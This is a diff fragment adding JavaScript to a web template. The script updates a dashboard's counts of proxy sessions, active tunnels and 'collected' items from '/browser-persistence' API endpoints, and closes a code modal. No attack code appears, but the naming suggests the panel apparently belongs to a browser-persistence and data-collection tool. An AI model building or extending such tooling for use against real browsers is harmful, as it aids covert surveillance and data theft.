+    });
+}
+
+// Close modal
+function closeModal() {
+    document.getElementById('codeModal').classList.add('hidden');
+    document.getElementById('codeModal').classList.remove('flex');
+}
+
+// Update stats
+async function updateStats() {
+    try {
+        const [sessionsRes, collectedRes] = await Promise.all([
+            fetch('/browser-persistence/api/proxy/sessions'),
+            fetch('/browser-persistence/api/collected')
+        ]);
+        
+        const sessions = await sessionsRes.json();
+        const collected = await collectedRes.json();
+        
+        if (sessions.success) {
+            document.getElementById('statsSessions').textContent = sessions.sessions.length;
+            document.getElementById('statsTunnels').textContent = 
+                sessions.sessions.filter(s => s.tunnel_active).length;
+        }
+        
+        if (collected.success) {
+            document.getElementById('statsCollected').textContent = collected.count;
+        }
+    } catch (error) {
+        console.error('Error updating stats:', error);
+    }
+}
+
+// Initialize
+document.addEventListener('DOMContentLoaded', () => {
+    updateStats();
+    refreshSessions();
+});
+
+// Close modal on escape
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closeModal();
+});
+</script>
+{% endblock %}
